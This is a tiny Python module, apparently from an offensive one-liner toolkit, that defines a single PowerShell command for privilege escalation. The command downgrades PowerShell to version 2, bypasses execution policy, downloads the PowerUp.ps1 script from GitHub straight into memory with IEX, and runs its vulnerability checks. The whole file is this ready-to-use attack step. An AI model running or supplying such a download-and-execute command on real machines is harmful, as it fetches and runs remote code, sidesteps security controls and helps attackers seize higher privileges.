class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and run powerup script to search for vulnerable services to privilege escalation opportunities and more"
    function    = "PrivEsc"
    liner     = """powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"""
